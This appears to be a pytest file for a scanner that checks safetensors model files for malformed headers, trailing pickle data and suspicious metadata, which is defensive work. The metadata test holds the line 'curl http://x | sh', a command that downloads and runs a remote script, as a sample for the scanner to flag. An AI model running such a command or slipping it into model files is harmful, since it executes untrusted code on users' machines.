import json

from static_fixtures import safetensors_bytes, write

from modelscan.models import Severity
from modelscan.static.base import Artifact, Kind
from modelscan.static.formats import safetensors as st


def _check(tmp_path, data, name="model.safetensors"):
    p = write(tmp_path / name, data)
    return st.check(Artifact(path=p, rel=name, size=len(data), kind=Kind.SAFETENSORS))


def _rules(findings):
    return {f.rule_id for f in findings}


def test_clean_file_has_no_findings(tmp_path):
    assert _check(tmp_path, safetensors_bytes(metadata={"format": "pt"})) == []


def test_trailing_pickle_is_critical(tmp_path):
    findings = _check(tmp_path, safetensors_bytes(trailing=b"\x80\x04payload"))
    (f,) = [f for f in findings if f.rule_id == "SFT-006"]
    assert f.severity == Severity.CRITICAL
    assert "pickle" in f.message


def test_trailing_junk_is_high(tmp_path):
    (f,) = _check(tmp_path, safetensors_bytes(trailing=b"\x01\x02\x03"))
    assert f.rule_id == "SFT-006" and f.severity == Severity.HIGH


def test_header_length_past_eof(tmp_path):
    data = (10**6).to_bytes(8, "little") + b"{}"
    assert _rules(_check(tmp_path, data)) == {"SFT-001"}


def test_duplicate_keys_flagged(tmp_path):
    hdr = (
        '{"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},'
        ' "w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}'
    )
    data = safetensors_bytes({}, header_override=hdr) + b"\x00" * 4
    assert _rules(_check(tmp_path, data)) == {"SFT-002"}


def test_size_mismatch_and_unknown_dtype(tmp_path):
    hdr = json.dumps({
        "a": {"dtype": "F32", "shape": [4], "data_offsets": [0, 8]},
        "b": {"dtype": "EVIL", "shape": [1], "data_offsets": [8, 9]},
    })  # fmt: skip
    data = safetensors_bytes({}, header_override=hdr) + b"\x00" * 9
    findings = _check(tmp_path, data)
    assert [f.rule_id for f in findings].count("SFT-003") == 2


def test_overlap_and_gap(tmp_path):
    hdr = json.dumps({
        "a": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]},
        "b": {"dtype": "U8", "shape": [4], "data_offsets": [2, 6]},
        "c": {"dtype": "U8", "shape": [2], "data_offsets": [10, 12]},
    })  # fmt: skip
    data = safetensors_bytes({}, header_override=hdr) + b"\x00" * 12
    assert {"SFT-004", "SFT-005"} <= _rules(_check(tmp_path, data))


def test_suspicious_metadata(tmp_path):
    data = safetensors_bytes(metadata={"note": "curl http://x | sh"})
    assert _rules(_check(tmp_path, data)) == {"SFT-008"}


def test_non_string_metadata(tmp_path):
    data = safetensors_bytes(metadata={"n": 1})
    assert _rules(_check(tmp_path, data)) == {"SFT-007"}
